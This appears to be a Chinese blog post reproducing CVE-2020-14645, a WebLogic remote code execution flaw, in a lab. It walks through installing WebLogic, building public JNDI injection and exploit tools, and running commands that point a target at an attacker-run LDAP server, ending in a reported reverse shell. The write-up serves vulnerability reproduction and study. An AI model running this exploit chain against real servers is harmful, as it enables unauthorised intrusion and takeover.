> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/COrpekNaitVQuCDHDfOl0w)

正文共： 1453 字 17 图  

预计阅读时间：4 分钟

  

**简介**

WebLogic 是美国 Oracle 公司出品的一个 application server，确切的说是一个基于 JAVAEE 架构的中间件，WebLogic 是用于开发、集成、部署和管理大型分布式 Web 应用、网络应用和数据库应用的 Java 应用服务器。将 Java 的动态功能和 Java Enterprise 标准的安全性引入大型网络应用的开发、集成、部署和管理之中。

攻击者可利用漏洞实现远程代码执行。

  

**影响版本**

Oracle WebLogic Server 10.3.6.0.0

Oracle WebLogic Server 12.1.3.0.0

Oracle WebLogic Server 12.2.1.3.0

Oracle WebLogic Server 12.2.1.4.0

Oracle WebLogic Server 14.1.1.0.0

  

**复现环境**

下载 JDK 6u211/7u201/8u191 任意版本并配置环境变量

本人用的 jdk8（下载地址：

https://mega.nz/file/1KIhjSCR#g0s5jekk3F9t55o3WXK_ahozuqn9_60eKSKt70we_uw）

WebLogic 12.2.1.4 官方下载地址：

https://www.oracle.com/middleware/technologies/weblogic-server-downloads.html

安装

![](https://mmbiz.qpic.cn/mmbiz_png/LW6H2Jdky5NSSaFjT98r5XYIpeTQTkfz3kmicgQsDUu6pM8E55Hq1jjyogjH7hIvicfra2VHpg0ZdicY3mia70wHSw/640?wx_fmt=png)

一直点下一步，勾选自助启动配置向导选项

![](https://mmbiz.qpic.cn/mmbiz_png/LW6H2Jdky5NSSaFjT98r5XYIpeTQTkfzibY4qWTibhZy4fz1X9Up6kODic69BVxRgGPagNdocz0SUxhfib9lebkq8A/640?wx_fmt=png)

进入配置向导，创建新域并勾选全部模板

![](https://mmbiz.qpic.cn/mmbiz_png/LW6H2Jdky5NSSaFjT98r5XYIpeTQTkfzS8OeMrmq5cR6OX1ARH356xk2FrJQEpNDxAgV04wP3zNtCWQYWICwOQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/LW6H2Jdky5NSSaFjT98r5XYIpeTQTkfz9ZCBy8bokb1PibyDkOstqa9UyZftIR06mcGJD81EicEfSgopa9Jv2Q0w/640?wx_fmt=png)

安装成功后，使用 cd 跳到 base_domain 目录下

C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain

运行 startWebLogic.cmd

![](https://mmbiz.qpic.cn/mmbiz_png/LW6H2Jdky5NSSaFjT98r5XYIpeTQTkfzGrjrPvW3GVIU6dmuHrbNZ0ibHXo2wLT5wibPqGXLeqK3CtdibtWpt35fQ/640?wx_fmt=png)

浏览器访问 http://IP:7001/console/login/LoginForm.jsp

![](https://mmbiz.qpic.cn/mmbiz_png/LW6H2Jdky5NSSaFjT98r5XYIpeTQTkfzRyXYAGmKDIz3F87JiarFfY7w1ADLbMOlM1VicIj3vr40egSQcoBIduLg/640?wx_fmt=png)

使用 JNDI 工具搭建 LDAP 和 HTTP 服务，注意不能占用 8180/1099/1389 三个端口，修改要执行的命令后回车，会同时启动 LDAP/RMI/HTTP 三种服务，并且自动编译好带命令的 class 文件

JNDI 工具下载地址：

https://github.com/welk1n/JNDI-Injection-Exploit

下载完成后进入目录编译

cd JNDI-Injection-Exploit

mvn clean package -DskipTests

![](https://mmbiz.qpic.cn/mmbiz_png/LW6H2Jdky5NSSaFjT98r5XYIpeTQTkfzibVialrnDwTTbojHib7SfTcARuGrRwkakpD5EsZxHUsQUq0PFtCZviaw4w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/LW6H2Jdky5NSSaFjT98r5XYIpeTQTkfzTsnNPw9ofMlLxej5eIRfbTMn1QseBqCtYj5Te7ppODZLwia7picS12Cg/640?wx_fmt=png)

编译的时间比较久，需要多等会（我在进行编译的时候，花了很久时间，是 Maven 源没更换导致的）

编译完成后进入 target，使用命令

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C [command] -A [address]

![](https://mmbiz.qpic.cn/mmbiz_png/LW6H2Jdky5NSSaFjT98r5XYIpeTQTkfzjZAr4ia4c5faPqZsYicNjSDicqzzkKTq2LkzteUpBDW3Ac5hDnrj9EuCQ/640?wx_fmt=png)

然后使用 CVE-2020-14645 漏洞验证工具

下载地址：https://github.com/DSO-Lab/defvul（推荐使用镜像地址：https://github.com.cnpmjs.org/DSO-Lab/defvul）

进入 CVE-2020-14645_Weblogic 目录下进行编译

![](https://mmbiz.qpic.cn/mmbiz_png/LW6H2Jdky5NSSaFjT98r5XYIpeTQTkfzFptOsZLVSxhWgyCEiaRXUVtjte3nZpLnt7IL2HPqIKaTBiaDMcicE9AvQ/640?wx_fmt=png)

因为我 kali 中的 jdk 版本为 11，该漏洞验证工具需要的 jdk 版本为 1.8；于是我又屁颠屁颠在 ubuntu 上装 java，装 mvn；开始编译

![](https://mmbiz.qpic.cn/mmbiz_png/LW6H2Jdky5NSSaFjT98r5XYIpeTQTkfzib8ER0jOTIBcJccJwmPLe1BeiaEnBicjt4OwKpuU6iat7ZeZ3Nttibhqekw/640?wx_fmt=png)

编译成功：

![](https://mmbiz.qpic.cn/mmbiz_png/LW6H2Jdky5NSSaFjT98r5XYIpeTQTkfznCYbnFicxqEYpAMAibdyJRbyLEN7TUjiar23utYQQ5YvVhPhSyPsAcU4w/640?wx_fmt=png)

然后进入 target

java -jar CVE-2020-14645.jar LDAP_IP:LDAP_PORT/#Exploit 

http://192.168.31.107:7001

![](https://mmbiz.qpic.cn/mmbiz_png/LW6H2Jdky5NSSaFjT98r5XYIpeTQTkfzOrYhbx1tia6iazECT2Sj9DUPmicFQLibBAwXPoMZCY9DtlJrldOw7NdYLA/640?wx_fmt=png)

成功反弹

![](https://mmbiz.qpic.cn/mmbiz_png/LW6H2Jdky5NSSaFjT98r5XYIpeTQTkfzls6vIpYTn1NDGdvVtZ8VCN1E7RZqzEKKmKQeedXbWQaqCqR7iakTfFw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/LW6H2Jdky5NSSaFjT98r5XYIpeTQTkfzf4IyXmwbAHCfMibSaCcISlbSZct9BhnPibRhvq2BHRdH59SiaybGIVYmQ/640?wx_fmt=png)

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/RQoDdorCu0V5znWFiaMBVWiaibdvAvmGeUvfC5LJ60x1Kq5wiaQ5UtMKEDcwQJ3ibicBdGBKxGs1V2AuZcg3ISoDto1g/640?wx_fmt=png)

  

END

  

扫描二维码

获取更多精彩

![](https://mmbiz.qpic.cn/mmbiz_jpg/LW6H2Jdky5NSSaFjT98r5XYIpeTQTkfzUganOyCePwOFRia4YRAG18er0CTCiczeuM05gdWDiaMRfgViavbHJlMQrA/640?wx_fmt=jpeg)